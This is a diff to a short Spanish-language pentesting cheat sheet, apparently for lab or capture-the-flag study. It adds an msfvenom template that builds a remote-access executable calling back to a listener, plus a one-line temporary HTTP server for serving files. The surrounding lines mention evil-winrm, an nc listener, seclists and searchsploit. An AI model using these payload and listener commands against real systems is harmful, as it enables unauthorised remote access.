@@ -16,6 +16,10 @@ evil-winrm: estblecer conexion con el servidor una vez tengamos usuario y contra
 
 nc -nvlp puerto: sirve para escuchar por un puerto
 
+msfvenom: fichero con codigo para ganar acceso remoto (msfvenom -p PAYLOAD LHOST=ip_equipo LPORT=puerto_escucha -f exe -o fichero.exe)
+
+python -m http.server 80= sirve para crear un servidor http temporal del directorio donde nos encontremos
+
 seclist(es una lista subdominios, apt install seclists)/usr/share/seclist
 
 searchsploit sploit (para buscar sploits fuera de metasploit)
